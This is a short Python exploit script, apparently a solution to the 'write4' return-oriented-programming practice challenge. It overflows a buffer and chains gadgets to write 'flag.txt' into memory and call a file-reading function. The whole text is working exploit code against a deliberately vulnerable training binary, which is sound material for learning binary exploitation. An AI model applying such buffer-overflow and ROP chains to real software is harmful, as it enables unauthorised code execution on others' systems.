#!/usr/bin/env python
from pwn import *

# setup binary
elf = context.binary = ELF('write4')
io = process(elf.path)

#memory values
pop_r14_r15 = 0x400690
r14 = 0x601028
r15 = 0x7478742e67616c66
mov_r14_r15 = 0x400628
pop_rdi = 0x400693
read_file = 0x400510

#creating payload
buf = ""    
buf += 'A'*40
buf += p64(pop_r14_r15)
buf += p64(r14) + p64(r15)  
buf += p64(mov_r14_r15)
buf += p64(pop_rdi)
buf += p64(r14)
buf += p64(read_file)

# sending payload
io.sendline(buf)
io.interactive()